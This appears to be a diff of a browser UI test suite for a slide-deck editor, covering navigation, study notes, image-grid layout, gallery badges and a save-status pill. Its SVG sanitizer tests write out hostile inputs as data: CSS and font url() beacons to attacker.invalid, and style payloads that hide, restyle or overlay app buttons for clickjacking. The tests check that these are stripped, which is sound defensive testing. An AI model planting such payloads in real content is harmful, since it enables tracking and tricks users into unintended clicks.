+    // Exactly one row is active AND it holds focus → a single, unified cursor.
+    await _waitFor(() => { const a = _tocRows().filter((r) => r.getAttribute("aria-selected") === "true"); return a.length === 1 && document.activeElement === a[0]; }, 1500);
+  }},
+  { name: "Collapsed sections: Up/Down move section-to-section, entering shows first slide", fn: async () => {
+    // Only sections WITH slides expose aria-expanded and can be folded (empty
+    // sections have nothing to collapse), so pick the first two of those.
+    const headers = await _waitFor(() => { const h = _tocHeaders().filter((x) => x.hasAttribute("aria-expanded")); return h.length >= 2 ? h : null; }, 2000);
+    if (!headers) return; // soft pass: needs >= 2 non-empty sections
+    await _selectTocHeader(headers[0]);
+    await _tocEnsureCollapsed(headers[0]);
+    await _tocEnsureCollapsed(headers[1]);
+    await _focusTocHeader(headers[0]);
+    const before = _hooks().getSelection && _hooks().getSelection();
+    if (!before) throw new Error("no getSelection test hook");
+    _key("ArrowDown");
+    // Down over a folded section jumps to the NEXT section and shows its first slide,
+    // instead of stepping through the current section's hidden slides.
+    await _waitFor(() => { const s = _hooks().getSelection(); return s && s.itemId !== before.itemId && s.slideIdx === 0; }, 1500);
+    // Neither section auto-expands during section-level nav.
+    if (_tocCollapsed(headers[0]) !== true || _tocCollapsed(headers[1]) !== true) throw new Error("section auto-expanded during section nav");
+    await _tocEnsureExpanded(headers[0]); await _tocEnsureExpanded(headers[1]); // restore
+  }},
+], { setup: _selectFirstModule });
+
 // ── Slide Content Suite ──────────────────────────────────────────────
 uiSuite("Content", [
   { name: "Slide has visible headings", fn: async () => {
@@ -9858,8 +11024,21 @@ uiSuite("Student Mode", [
     if (!btn) throw new Error("student-toggle not found");
     _click(btn);
     await _waitFor(() => _$("[data-teacher-panel]"), 5000);
+    // The demo deck has slides with pre-authored studyNotes; on those the student
+    // panel renders the static StaticStudyPanel (data-study-panel), NOT the live
+    // TeacherPanel. The next tests assert TeacherPanel's shell (which renders
+    // unconditionally, no AI needed), so navigate to a notes-free slide —
+    // TeacherPanel is [data-teacher-panel] WITHOUT data-study-panel. (These 4 tests
+    // were previously mislabeled requiresAI, hiding this suite-ordering dependency.)
+    for (let i = 0; i < 40 && _$("[data-teacher-panel][data-study-panel]"); i++) {
+      _key("ArrowRight"); await _wait(90);
+    }
+    await _waitFor(() => _$("[data-teacher-panel]:not([data-study-panel])"), 2000).catch(() => {});
   }},
   { name: "Teacher panel renders VERA header", fn: async () => {
+    // TeacherPanel renders its VERA header / disclaimer / Ask UI unconditionally
+    // (no AI backend needed). The suite setup navigates to a notes-free slide so
+    // this is TeacherPanel, not StaticStudyPanel — see "Activate student mode".
     const panel = _$("[data-teacher-panel]");
     return !!panel && (panel.textContent || "").includes("VERA");
   }},
@@ -9945,13 +11124,13 @@ uiSuite("Student Mode", [
 ]);
 
 // ── v12.32: Offline Study Notes Suite ───────────────────────────────
-// Uses the test-only affordance window.__velaTestInjectStudyNotes to
+// Uses the test-only affordance _hooks().injectStudyNotes (test-hook bridge) to
 // patch the current slide with a pre-authored studyNotes object, then
 // exercises the offline StaticStudyPanel rendering (text + glossary
 // X-Ray links + questions + diagram). Does not depend on a live API.
 uiSuite("Study Notes", [
-  { name: "Test hook __velaTestInjectStudyNotes available", fn: async () => {
-    if (typeof window.__velaTestInjectStudyNotes !== "function") throw new Error("window.__velaTestInjectStudyNotes not exposed");
+  { name: "Test hook injectStudyNotes available", fn: async () => {
+    if (typeof _hooks().injectStudyNotes !== "function") throw new Error("_hooks().injectStudyNotes not exposed");
   }},
   { name: "Inject studyNotes into current slide", fn: async () => {
     const sn = {
@@ -9960,7 +11139,7 @@ uiSuite("Study Notes", [
       questions: ["Why does this matter?", "When does it fail?"],
       glossary: { agent: { definition: "A goal-driven loop that plans, acts, observes.", url: "https://example.com/a" } }
     };
-    const ok = window.__velaTestInjectStudyNotes(sn);
+    const ok = _hooks().injectStudyNotes(sn);
     if (!ok) throw new Error("inject returned false — no current slide");
     await _wait(150);
   }},
@@ -10029,7 +11208,7 @@ uiSuite("Study Notes", [
   }},
   { name: "Clean up injected studyNotes", fn: async () => {
     // Undo the UPDATE_SLIDE so we don't leak state into later tests
-    window.__velaTestInjectStudyNotes(undefined);
+    _hooks().injectStudyNotes(undefined);
     await _wait(100);
   }},
 ]);
@@ -10054,16 +11233,16 @@ uiSuite("Editor UX (CR1–CR3)", [
     if (Math.abs(ratio - 16 / 9) > 0.05) throw new Error(`viewport not 16:9 — ratio=${ratio.toFixed(3)} (${Math.round(r.width)}x${Math.round(r.height)})`);
   }},
   { name: "CR3: toolbar position stable + viewport size fixed across differing content", fn: async () => {
-    if (typeof window.__velaTestInjectBlocks !== "function") throw new Error("__velaTestInjectBlocks not exposed");
+    if (typeof _hooks().injectBlocks !== "function") throw new Error("injectBlocks test hook not exposed");
     if (!_$("[data-testid='slide-toolbar']")) throw new Error("slide-toolbar not found");
     // Light slide, no notes.
-    window.__velaTestInjectBlocks([{ type: "heading", text: "LIGHT" }], { notes: "" });
+    _hooks().injectBlocks([{ type: "heading", text: "LIGHT" }], { notes: "" });
     await _wait(180);
     const tb1 = _$("[data-testid='slide-toolbar']").getBoundingClientRect();
     const vp1 = _$("[data-testid='slide-viewport']").getBoundingClientRect();
     // Heavy slide with lots of content AND speaker notes — the pre-fix notes
     // auto-expand + elastic viewport would shove the toolbar upward here.
-    window.__velaTestInjectBlocks([
+    _hooks().injectBlocks([
       { type: "heading", text: "HEAVY CONTENT SLIDE" },
       { type: "bullets", items: ["one", "two", "three", "four", "five", "six", "seven", "eight"] },
       { type: "text", text: "A long paragraph ".repeat(20) },
@@ -10074,14 +11253,14 @@ uiSuite("Editor UX (CR1–CR3)", [
     if (Math.abs(tb1.top - tb2.top) > 1.5) throw new Error(`toolbar moved with content/notes: ${tb1.top.toFixed(1)} -> ${tb2.top.toFixed(1)}`);
     if (Math.abs(vp1.height - vp2.height) > 1.5) throw new Error(`viewport height changed with content: ${vp1.height.toFixed(1)} -> ${vp2.height.toFixed(1)}`);
     // Restore a benign single heading.
-    window.__velaTestInjectBlocks([{ type: "heading", text: "" }], { notes: "" });
+    _hooks().injectBlocks([{ type: "heading", text: "" }], { notes: "" });
     await _wait(80);
   }},
   { name: "CR2: centered heading renders centered in editor (icon-slot path)", fn: async () => {
-    if (typeof window.__velaTestInjectBlocks !== "function") throw new Error("__velaTestInjectBlocks not exposed");
+    if (typeof _hooks().injectBlocks !== "function") throw new Error("injectBlocks test hook not exposed");
     // Inject a centered heading (NO icon → the editor still forces its icon-slot
     // flex row, which is exactly the path that used to drop centering).
-    const okc = window.__velaTestInjectBlocks([{ type: "heading", text: "CENTERED TITLE UITEST", size: "2xl", align: "center" }]);
+    const okc = _hooks().injectBlocks([{ type: "heading", text: "CENTERED TITLE UITEST", size: "2xl", align: "center" }]);
     if (!okc) throw new Error("inject returned false — no current slide");
     await _wait(200);
     // Leaf element that actually holds the text node.
@@ -10107,11 +11286,125 @@ uiSuite("Editor UX (CR1–CR3)", [
       if (Math.abs(leftGap - rightGap) > cr.width * 0.2) throw new Error(`glyphs not centered — leftGap=${leftGap.toFixed(1)} rightGap=${rightGap.toFixed(1)}`);
     }
   }},
+  { name: "CR4/D2: image grid never overflows the slide canvas (N=4, heavy-text, portrait)", fn: async () => {
+    if (typeof _hooks().injectBlocks !== "function") throw new Error("injectBlocks test hook not exposed");
+    // Tiny data-URI images with explicit intrinsic aspect ratios (SVG viewBox).
+    // A TALL/portrait image is the exact case that used to balloon a grid row
+    // (gridAutoRows:1fr = minmax(auto,1fr)) off the bottom of the canvas.
+    const land = "data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20width='400'%20height='100'%3E%3Crect%20width='400'%20height='100'%20fill='%233b82f6'/%3E%3C/svg%3E";
+    const tall = "data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20width='100'%20height='400'%3E%3Crect%20width='100'%20height='400'%20fill='%23ef4444'/%3E%3C/svg%3E";
+    const gridBottomOverflow = () => {
+      const grid = _$("[data-testid='image-grid']");
+      if (!grid) return null;
+      const vp = _$("[data-testid='slide-viewport']");
+      const gb = grid.getBoundingClientRect();
+      const vb = vp.getBoundingClientRect();
+      return gb.bottom - vb.bottom; // >0 means the grid spills below the canvas
+    };
+    // CR4/D2b: every grid-cell <img> must be VISIBLE (rendered height > 0). The
+    // absolute-fill img resolves height:100% through the nested ZoomWrap wrapper;
+    // if that intermediate div carries no height the img collapses to 0 (invisible).
+    const zeroHeightImgs = () => {
+      const grid = _$("[data-testid='image-grid']");
+      if (!grid) return null;
+      const imgs = Array.from(grid.querySelectorAll("img"));
+      if (!imgs.length) return -1; // no imgs found at all
+      return imgs.filter((im) => im.getBoundingClientRect().height <= 0).length;
+    };
+    const assertVisibleAndUniform = (label) => {
+      const z = zeroHeightImgs();
+      if (z == null) throw new Error(`${label}: image grid not rendered`);
+      if (z === -1) throw new Error(`${label}: no <img> found in grid`);
+      if (z > 0) throw new Error(`${label}: ${z} grid-cell <img> rendered at height 0 (invisible)`);
+      const cells = _$$("[data-testid='image-grid-cell']");
+      if (cells.length >= 2) {
+        const hs = cells.map((c) => c.getBoundingClientRect().height);
+        const maxH = Math.max(...hs), minH = Math.min(...hs);
+        if (maxH - minH > 2) throw new Error(`${label}: grid cells not uniform height: ${minH.toFixed(1)}..${maxH.toFixed(1)}`);
+      }
+    };
+    // Cases: N=2..5 landscape runs — each must be contained AND visible.
+    for (const N of [2, 3, 4, 5]) {
+      const imgs = []; for (let k = 0; k < N; k++) imgs.push({ type: "image", src: land });
+      _hooks().injectBlocks([{ type: "heading", text: `GRID N${N}` }, ...imgs]);
+      await _waitFor(() => _$("[data-testid='image-grid']"), 2000);
+      await _wait(160);
+      const o = gridBottomOverflow();
+      if (o == null) throw new Error(`image grid not rendered for N=${N}`);
+      if (o > 2) throw new Error(`N=${N} grid overflows canvas bottom by ${o.toFixed(1)}px`);
+      assertVisibleAndUniform(`N=${N}`);
+    }
+    // Case B: heavy heading/text + 4 images — text steals height, rows must shrink.
+    _hooks().injectBlocks([
+      { type: "heading", text: "HEAVY + FOUR IMAGES" },
+      { type: "text", text: "A long paragraph ".repeat(16) },
+      { type: "image", src: land }, { type: "image", src: land },
+      { type: "image", src: land }, { type: "image", src: tall },
+    ]);
+    await _waitFor(() => _$("[data-testid='image-grid']"), 2000);
+    await _wait(160);
+    let o = gridBottomOverflow();
+    if (o == null) throw new Error("image grid not rendered for heavy-text+4");
+    if (o > 2) throw new Error(`heavy-text+4 grid overflows canvas bottom by ${o.toFixed(1)}px`);
+    assertVisibleAndUniform("heavy-text+4");
+    // Case C: a portrait image among the run must not balloon its row off-canvas —
+    // it letterboxes (objectFit:contain) into a uniform cell AND stays visible.
+    _hooks().injectBlocks([
+      { type: "heading", text: "PORTRAIT MIX" },
+      { type: "image", src: land }, { type: "image", src: tall },
+    ]);
+    await _waitFor(() => _$("[data-testid='image-grid']"), 2000);
+    await _wait(160);
+    o = gridBottomOverflow();
+    if (o == null) throw new Error("image grid not rendered for portrait mix");
+    if (o > 2) throw new Error(`portrait-mix grid overflows canvas bottom by ${o.toFixed(1)}px`);
+    assertVisibleAndUniform("portrait-mix");
+  }},
   { name: "CR2: cleanup injected blocks", fn: async () => {
     // Best-effort: restore by selecting first module again (reload path).
     // Injected block persists only in state; leaving it is harmless for later
     // suites, but we blank it to a minimal heading to reduce noise.
-    try { window.__velaTestInjectBlocks([{ type: "heading", text: "" }]); } catch {}
+    try { _hooks().injectBlocks([{ type: "heading", text: "" }]); } catch {}
+    await _wait(80);
+  }},
+], { setup: _selectFirstModule });
+
+// ── Block-item reorder (▲▼ arrows) — v13.19 ──────────────────────────
+// Hovering an item of a multi-item block in edit mode reveals a stacked
+// ▲▼ control (next to the ✕ delete) that swaps the item with its neighbour.
+// Asserts the swap moves the item and that the arrow is disabled at a boundary.
+uiSuite("Block item reorder (▲▼) — v13.19", [
+  { name: "▲▼ arrows move a bullet up/down; boundary arrow disabled", fn: async () => {
+    if (typeof _hooks().injectBlocks !== "function") throw new Error("injectBlocks test hook not exposed");
+    const ok = _hooks().injectBlocks([{ type: "bullets", items: ["ALPHAUT", "BRAVOUT", "CHARLIEUT"] }]);
+    if (!ok) throw new Error("inject returned false — no current slide");
+    await _wait(200);
+    const order = () => _$$("[data-testid='slide-viewport'] *")
+      .filter((d) => d.children.length === 0 && /^(ALPHAUT|BRAVOUT|CHARLIEUT)$/.test((d.textContent || "").trim()))
+      .map((d) => d.textContent.trim());
+    await _waitFor(() => order().length === 3, 2000);
+    if (JSON.stringify(order()) !== JSON.stringify(["ALPHAUT", "BRAVOUT", "CHARLIEUT"])) throw new Error("initial order wrong: " + order());
+    // Walk up from the item's text leaf to the ItemChrome wrapper (position:relative).
+    const leafOf = (t) => _$$("[data-testid='slide-viewport'] *").find((d) => d.children.length === 0 && (d.textContent || "").trim() === t);
+    const wrapperOf = (t) => { let el = leafOf(t); while (el && el !== document.body) { if (getComputedStyle(el).position === "relative") return el; el = el.parentElement; } return null; };
+    const hover = (el) => el.dispatchEvent(new MouseEvent("mouseover", { bubbles: true }));
+    // Move BRAVOUT up → [BRAVOUT, ALPHAUT, CHARLIEUT].
+    const w = wrapperOf("BRAVOUT");
+    if (!w) throw new Error("no wrapper for BRAVOUT");
+    hover(w);
+    const up = await _waitFor(() => _$$("button", w).find((b) => b.title === "Move up" && !b.disabled), 1500);
+    _click(up);
+    await _waitFor(() => JSON.stringify(order()) === JSON.stringify(["BRAVOUT", "ALPHAUT", "CHARLIEUT"]), 2000);
+    // BRAVOUT is now first → its Move up must be disabled.
+    const w2 = wrapperOf("BRAVOUT");
+    hover(w2);
+    const up2 = await _waitFor(() => _$$("button", w2).find((b) => b.title === "Move up"), 1500);
+    if (!up2.disabled) throw new Error("first item Move up not disabled");
+    // Move it back down to restore original order.
+    const down = await _waitFor(() => _$$("button", w2).find((b) => b.title === "Move down" && !b.disabled), 1500);
+    _click(down);
+    await _waitFor(() => JSON.stringify(order()) === JSON.stringify(["ALPHAUT", "BRAVOUT", "CHARLIEUT"]), 2000);
+    try { _hooks().injectBlocks([{ type: "heading", text: "" }]); } catch {}
     await _wait(80);
   }},
 ], { setup: _selectFirstModule });
@@ -10195,13 +11488,16 @@ uiSuite("SVG Sanitizer (XSS)", [
     const out = sanitizeSvgMarkup('<style>* { background: \\75rl("https://attacker.invalid/") }</style><rect/>');
     return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
   }},
-  { name: "SVG <style> with safe class CSS preserved (Mermaid/Vera compat)", fn: async () => {
+  { name: "SVG <style> element stripped (document-global CSS disallowed; shapes still render)", fn: async () => {
+    // A <style> is document-global (not SVG-scoped) — dropped outright, not filtered.
+    // The shape element survives so geometry still renders; only the class CSS is gone.
     const out = sanitizeSvgMarkup('<style>.node{fill:#3b82f6;stroke:#888}.edge{stroke-width:2}</style><rect class="node"/>');
-    return /<style/i.test(out) && /#3b82f6/.test(out) && /\.node/.test(out);
+    return !/<style[\s>]/i.test(out) && !/#3b82f6/.test(out) && /<rect[^>]*class="node"/i.test(out);
   }},
-  { name: "SVG <style> with url(#fragment) preserved (paint-server refs)", fn: async () => {
-    const out = sanitizeSvgMarkup('<style>.arrow{fill:url(#grad1);marker-end:url(#mark)}</style><rect class="arrow"/>');
-    return /<style/i.test(out) && /url\(#grad1\)/.test(out) && /url\(#mark\)/.test(out);
+  { name: "SVG url(#fragment) paint refs preserved via presentation attrs (<style> dropped)", fn: async () => {
+    // Paint-server refs belong on presentation attributes, which remain allowed+validated.
+    const out = sanitizeSvgMarkup('<rect fill="url(#grad1)" marker-end="url(#mark)" clip-path="url(#c)"/>');
+    return /fill="url\(#grad1\)"/.test(out) && /marker-end="url\(#mark\)"/.test(out) && /clip-path="url\(#c\)"/.test(out);
   }},
   // v12.59 — string-source CSS image functions (no url() token) auto-fetch on
   // render. image-set/image/cross-fade/src were the residual bypass of the
@@ -10241,9 +11537,50 @@ uiSuite("SVG Sanitizer (XSS)", [
     const out = sanitizeSvgMarkup('<style>@font-face{font-family:x;src:url(https://attacker.invalid/f)}text{font-family:x}</style><text x="1" y="9">A</text>');
     return !/attacker\.invalid/i.test(out) && !/@font-face/i.test(out) && !/<style[\s>]/i.test(out);
   }},
-  { name: "SVG url(#fragment) with whitespace/quotes still preserved (no false reject)", fn: async () => {
-    const out = sanitizeSvgMarkup('<style>.a{fill:url( #grad )}.b{mask:url("#m")}</style><rect class="a" clip-path="url(#c)"/>');
-    return /<style/i.test(out) && /#grad/.test(out) && /url\(#c\)/.test(out);
+  { name: "SVG url(#fragment) whitespace on presentation attr preserved (no false reject)", fn: async () => {
+    // isSvgStyleSafe still guards url-ref presentation attrs; url( #frag ) must not false-reject.
+    const out = sanitizeSvgMarkup('<rect fill="url( #grad )" clip-path="url(#c)"/>');
+    return /#grad/.test(out) && /url\(#c\)/.test(out);
+  }},
+  { name: "SECURITY: deck SVG <style> cannot restyle/relocate app chrome (S16/S17 redress+clickjack)", fn: async () => {
+    // The load-bearing regression test for the UI-integrity family: render a
+    // hostile deck SVG the SAME way the app does (sanitize -> innerHTML) and prove
+    // deck CSS cannot reach a real app control (no restyle, no reposition, no hide).
+    const victim = document.createElement("button");
+    victim.setAttribute("title", "Delete slide (Del)");
+    victim.style.background = "rgb(1, 2, 3)";
+    document.body.appendChild(victim);
+    const host = document.createElement("div");
+    document.body.appendChild(host);
+    try {
+      const payload = '<style>button[title^="Delete slide"]{position:fixed !important;background:rgb(34,197,94) !important;opacity:0 !important}*{color:red !important}</style><rect width="10" height="10"/>';
+      host.innerHTML = sanitizeSvgMarkup(payload);
+      const noStyle = !host.querySelector("style") && !/<style[\s>]/i.test(host.innerHTML);
+      const cs = getComputedStyle(victim);
+      const bg = (cs.backgroundColor || "").replace(/\s/g, "");
+      const unaffected = bg === "rgb(1,2,3)" && cs.position !== "fixed" && cs.opacity === "1";
+      return noStyle && unaffected;
+    } finally { host.remove(); victim.remove(); }
+  }},
+  { name: "SECURITY: deck SVG inline style cannot overlay app chrome (fixed-position clickjack)", fn: async () => {
+    // R4A vector: the <style> ELEMENT was removed, but an inline style="" on an SVG
+    // element carrying position:fixed/inset/z-index/viewport-sizing escapes the
+    // non-clipped study-notes/teacher diagram sinks and overlays whole-app chrome.
+    // Prove the real sanitizer output produces no viewport-covering fixed/absolute element.
+    const host = document.createElement("div");
+    document.body.appendChild(host);
+    try {
+      const payload = '<rect fill="red" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;pointer-events:auto"/><g style="position:fixed;inset:0;z-index:99999"><rect width="50" height="50"/></g>';
+      host.innerHTML = sanitizeSvgMarkup(payload);
+      const overlay = Array.from(host.querySelectorAll("*")).some((el) => {
+        const p = getComputedStyle(el).position;
+        return p === "fixed" || p === "absolute";
+      });
+      const mid = document.elementFromPoint(Math.floor(innerWidth / 2), Math.floor(innerHeight / 2));
+      const covered = !!(mid && host.contains(mid));
+      const clean = !/position\s*:/i.test(host.innerHTML) && !/z-index/i.test(host.innerHTML) && /fill="red"/.test(host.innerHTML);
+      return !overlay && !covered && clean;
+    } finally { host.remove(); }
   }},
   { name: "SVG external <image href> beacon removed (#fragment only)", fn: async () => {
     const out = sanitizeSvgMarkup('<image href="https://attacker.invalid/b.png"/>');
@@ -10442,13 +11779,14 @@ uiSuite("Gallery View", [
     await _waitFor(() => _$text("G or ESC to close"), 1000);
   }},
   { name: "Click card navigates", fn: async () => {
-    const nums = _$$("span").filter(s => /^\d+$/.test(s.textContent?.trim()) && s.style?.fontFamily?.includes("mono"));
-    const card2 = nums.find(n => n.textContent?.trim() === "2");
-    if (card2) {
-      const cardEl = card2.closest("div[style*='cursor: pointer'], div[style*='cursor:pointer']");
-      if (cardEl) _click(cardEl);
-    }
-    await _wait(400);
+    // Click a real gallery card by its stable data-testid (the clickable card div,
+    // part-slides.jsx). Clicking it runs jump() -> SELECT + SET_SLIDE_INDEX + onClose,
+    // so the gallery closes. (Previously this hunted a mono "2" span + a cursor-style
+    // substring, which could match a non-card span and silently no-op.)
+    const cards = _$$("[data-testid='gallery-slide']");
+    if (!cards.length) throw new Error("no gallery-slide cards rendered");
+    _click(cards[0]);
+    await _waitFor(() => !_$text("GALLERY"), 1500).catch(() => {});
     return !_$text("GALLERY");
   }},
   { name: "G key toggles gallery off", fn: async () => {
@@ -10510,6 +11848,36 @@ uiSuite("Gallery From Editor", [
     await _waitFor(() => _$text("GALLERY"), 2000);
     _key("Escape");
     await _waitFor(() => !_$text("GALLERY"), 2000);
+  }},
+  { name: "CR1/D8: gallery page badge total excludes virtual title cards", fn: async () => {
+    document.activeElement?.blur();
+    for (let i = 0; i < 2; i++) { _key("Escape"); await _wait(80); }
+    if (_$text("GALLERY")) { _key("g"); await _waitFor(() => !_$text("GALLERY"), 1500).catch(() => {}); }
+    // Enable a title card on the first section so the gallery renders a 🎬 virtual card.
+    const tc = _$$("span").find((s) => /Title card/i.test(s.title || ""));
+    if (!tc) throw new Error("title-card 🎬 toggle not found in TOC");
+    const wasOn = /ON/i.test(tc.title || "");
+    if (!wasOn) { _click(tc); await _waitFor(() => _$$("span").some((s) => /Title card ON/i.test(s.title || "")), 1500); }
+    // Open the gallery from the editor.
+    const gbtn = await _waitFor(() => _$("[data-testid='editor-gallery-toggle']"), 2000);
+    _click(gbtn);
+    await _waitFor(() => _$text("GALLERY"), 2000);
+    const root = await _waitFor(() => _$("[data-teacher-panel]"), 2000);
+    await _wait(150);
+    // The virtual title card must actually be present (else the total can't be inflated).
+    if (_$$("[data-testid='gallery-title-card']", root).length === 0) throw new Error("no virtual title card rendered — cannot exercise the badge total");
+    const realCards = _$$("[data-testid='gallery-slide']", root);
+    const realCount = realCards.length;
+    // A real thumbnail's page-number badge (NN / NN): its denominator must be the
+    // REAL slide count, NOT inflated by the virtual title card(s) → matches presentation.
+    const badgeTotalOf = (card) => { const el = _$$("*", card).find((e) => e.children.length === 0 && /^\d+\s*\/\s*\d+$/.test((e.textContent || "").trim())); return el ? parseInt((el.textContent || "").trim().split("/")[1], 10) : null; };
+    let total = null;
+    for (const c of realCards) { total = badgeTotalOf(c); if (total != null) break; }
+    if (total == null) throw new Error("no page-number badge found on gallery thumbnails");
+    if (total !== realCount) throw new Error(`gallery badge total ${total} != real slide count ${realCount} (virtual title cards leaked into the total)`);
+    // Cleanup: close gallery + restore the title-card toggle to its prior state.
+    _key("Escape"); await _waitFor(() => !_$text("GALLERY"), 2000).catch(() => {});
+    if (!wasOn) { const t2 = _$$("span").find((s) => /Title card ON/i.test(s.title || "")); if (t2) { _click(t2); await _wait(120); } }
   }},
 ]);
 
@@ -10921,6 +12289,277 @@ uiSuite("Move Picker Search (F6)", [
     if (bd) _click(bd); await _wait(150);
   }},
 ], { setup: _editorSetup });
+
+// Desktop save-status pill (CR3) — the "no hint or error" half of the Windows
+// silent-save bug. Drives the app's save-status channel (window.__velaOnSaveStatus,
+// wired by the app effect; nl-boot feeds it from deck-io on the real desktop) and
+// asserts the pill's state machine + the Retry affordance. Stable test-ids:
+//   save-status-pill  (data-save-state = saving|saved|failed|reconnecting)
+//   save-status-retry / save-failed-toast / save-failed-toast-retry
+const _savePill = () => _$('[data-testid="save-status-pill"]');
+const _saveState = () => { const p = _savePill(); return p ? p.getAttribute("data-save-state") : null; };
+uiSuite("Desktop save-status pill (CR3)", [
+  { name: "channel wired: window.__velaOnSaveStatus is a function", fn: async () => {
+    if (typeof window.__velaOnSaveStatus !== "function") throw new Error("save-status channel not wired");
+  }},
+  { name: "saving → saved renders the pill with 'Saved' copy", fn: async () => {
+    window.__velaOnSaveStatus({ state: "saving", at: Date.now() });
+    await _waitFor(() => _saveState() === "saving", 2000);
+    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
+    const pill = await _waitFor(() => (_saveState() === "saved" ? _savePill() : null), 2000);
+    if (!/Saved/.test(pill.textContent || "")) throw new Error("saved pill missing copy: " + pill.textContent);
+  }},
+  { name: "failed save surfaces a Retry pill + one-shot toast (not swallowed)", fn: async () => {
+    window.__velaOnSaveStatus({ state: "failed", at: Date.now(), error: "mock write reject" });
+    const pill = await _waitFor(() => (_saveState() === "failed" ? _savePill() : null), 2000);
+    if (!/Retry/i.test(pill.textContent || "")) throw new Error("failed pill missing Retry: " + pill.textContent);
+    await _waitFor(() => _$('[data-testid="save-failed-toast"]'), 2000);
+  }},
+  { name: "Retry invokes __velaForceSave and returns to Saved", fn: async () => {
+    const orig = window.__velaForceSave;
+    let called = 0;
+    window.__velaForceSave = () => { called++; window.__velaOnSaveStatus({ state: "saved", at: Date.now() }); };
+    try {
+      window.__velaOnSaveStatus({ state: "failed", at: Date.now() });
+      const pill = await _waitFor(() => (_saveState() === "failed" ? _savePill() : null), 2000);
+      _click(pill);
+      if (called < 1) throw new Error("__velaForceSave was not called by Retry");
+      await _waitFor(() => _saveState() === "saved", 2000);
+    } finally {
+      window.__velaForceSave = orig;
+    }
+  }},
+  { name: "D6: dismissed toast does NOT re-arm on reconnecting→failed (only a real save re-arms)", fn: async () => {
+    const toast = () => _$('[data-testid="save-failed-toast"]');
+    const dismiss = () => { const x = _$('[data-testid="save-failed-toast"] [title="Dismiss"]'); if (x) _click(x); };
+    // Start armed from a clean saved state.
+    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
+    await _wait(60);
+    // 1) First failure raises the one-shot toast → dismiss it.
+    window.__velaOnSaveStatus({ state: "failed", at: Date.now(), error: "mock" });
+    await _waitFor(() => toast(), 2000);
+    dismiss();
+    await _waitFor(() => !toast(), 1500);
+    // 2) reconnecting → failed AGAIN with NO successful save in between: must stay dismissed.
+    window.__velaOnSaveStatus({ state: "reconnecting", at: Date.now() });
+    await _wait(80);
+    window.__velaOnSaveStatus({ state: "failed", at: Date.now(), error: "mock2" });
+    await _wait(300);
+    if (toast()) throw new Error("dismissed toast wrongly re-armed on reconnecting→failed (no save between)");
+    // 3) A genuine successful save re-arms; a subsequent failure MAY show again.
+    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
+    await _wait(80);
+    window.__velaOnSaveStatus({ state: "failed", at: Date.now(), error: "mock3" });
+    await _waitFor(() => toast(), 2000);
+    // Cleanup.
+    dismiss();
+    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
+    await _wait(40);
+    window.__velaOnSaveStatus(null);
+    await _wait(40);
+  }},
+  { name: "reconnecting renders an amber pill; then cleans up", fn: async () => {
+    window.__velaOnSaveStatus({ state: "reconnecting", at: Date.now() });
+    const pill = await _waitFor(() => (_saveState() === "reconnecting" ? _savePill() : null), 2000);
+    if (!/Reconnect/i.test(pill.textContent || "")) throw new Error("reconnecting copy missing: " + pill.textContent);
+    // Cleanup so the pill/toast don't leak into later suites.
+    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
+    await _wait(60);
+    window.__velaOnSaveStatus(null);
+    await _waitFor(() => _savePill() == null, 1500).catch(() => {});
+  }},
+]);
+
+// ── CR5: Consistent AI-working animation ─────────────────────────────
+// Deterministic, offline-friendly proof of the unified aiWork → vera-thinking /
+// magic-reveal contract. No live AI backend needed: we drive the reducer flag
+// directly via the app's test hook (_hooks().setAIWork) and assert the
+// on-screen slide's fx-wrapper class contract, the accent CSS var, off-screen
+// isolation, and the CSS (accent-tinted sweep + reduced-motion) rules.
+const _fxWrap = () => _$("[data-testid='slide-fx-wrapper']");
+// Canonicalize a CSS color so an authored hex and a browser rgb() serialization
+// compare equal. --vera-accent is a registered custom property
+// (@property { syntax: "<color>" }) — once registered, getComputedStyle returns
+// the COMPUTED "rgb(r, g, b)" form, not the "#rrggbb" the deck authored. Round
+// tripping both sides through an element's computed `color` normalizes either
+// serialization; if the UA can't parse the value we fall back to a whitespace-
+// stripped lowercase compare (the pre-registration behaviour).
+const _normColor = (v) => {
+  const raw = String(v == null ? "" : v).trim();
+  const flat = raw.toLowerCase().replace(/\s+/g, "");
+  if (!raw) return "";
+  try {
+    const el = document.createElement("span");
+    el.style.color = raw;
+    if (!el.style.color) return flat;      // UA rejected it — nothing to normalize
+    el.style.position = "absolute";
+    el.style.visibility = "hidden";
+    document.body.appendChild(el);
+    const out = getComputedStyle(el).color;
+    el.remove();
+    return out ? out.toLowerCase().replace(/\s+/g, "") : flat;
+  } catch { return flat; }
+};
+// Return the fx-wrapper to a static state (clear the flag, wait out any settle).
+const _settleFx = async () => {
+  if (typeof _hooks().setAIWork === "function") _hooks().setAIWork(null);
+  await _waitFor(() => { const w = _fxWrap(); return w && !w.classList.contains("magic-reveal") && !w.classList.contains("vera-thinking"); }, 2600).catch(() => {});
+};
+// Bring the app to editor mode with a slide (and its fx-wrapper) on screen —
+// a prior suite may leave it in fullscreen / gallery / a modal / a collapsed rail.
+const _cr5Setup = async () => {
+  await _exitFullscreen();
+  document.activeElement?.blur?.();
+  for (let i = 0; i < 3; i++) { _key("Escape"); await _wait(90); }
+  // Prefer a TOC slide row — clicking it selects a module that actually HAS a
+  // slide (the first .concept-row can be an empty section → "No slides yet",
+  // which renders no fx-wrapper). Fall back to scanning module rows for one with
+  // slides on screen.
+  const toc = _tocRows()[0];
+  if (toc) { _click(toc); await _wait(200); }
+  if (!_$("[data-testid='slide-viewport']")) {
+    for (const r of _$$(".concept-row")) { _click(r); await _wait(150); if (_$("[data-testid='slide-viewport']")) break; }
+  }
+  await _waitFor(_fxWrap, 3000).catch(() => {});
+};
+// Collect all readable CSS text (same-origin inline <style>; skip cross-origin).
+const _allCssText = () => {
+  let css = "";
+  for (const sheet of Array.from(document.styleSheets)) {
+    let rules; try { rules = sheet.cssRules; } catch { continue; }
+    if (!rules) continue;
+    for (const r of Array.from(rules)) css += r.cssText + "\n";
+  }
+  return css;
+};
+uiSuite("AI-working animation (CR5)", [
